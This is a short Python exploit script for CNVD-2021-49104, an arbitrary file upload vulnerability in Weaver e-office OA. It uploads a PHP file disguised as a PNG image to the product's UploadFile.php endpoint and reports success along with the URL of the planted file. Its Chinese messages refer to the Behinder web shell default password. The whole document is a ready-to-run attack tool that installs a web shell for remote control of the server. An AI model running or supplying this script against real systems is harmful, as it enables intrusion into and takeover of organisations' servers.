#CNVD-2021-49104
import re
import time
import requests
import urllib3
from rich.console import Console


console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

    
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        }
    upload_url=target_url+'general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId='
    exp_url=target_url+'images/logo/logo-eoffice.php'
    console.print(now_time() + " [INFO]     正在检测任意文件上传漏洞 CNVD-2021-49104", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        file = [('file1', ('index123.php', open('main/weaver/poc/index123.php', 'rb'), 'image/png'))]
        upload = requests.post(upload_url, headers=headers, files=file, verify=False)
        if upload.status_code == 200 and 'logo-eoffice.php' in upload.text:
            console.print(now_time() + ' [SUCCESS]  泛微OAUploadFile任意文件上传漏洞存在,冰蝎默认密码:{}'.format(exp_url), style='bold green')
        else:
            console.print(now_time() + ' [WARNING]  泛微OAUploadFile任意文件上传漏洞不存在', style='bold red ')
    except:
        console.print(now_time() + " [ERROR]    出错了，手工复现下吧 ", style='bold red')
    
    
    
    
    
    
 
        
    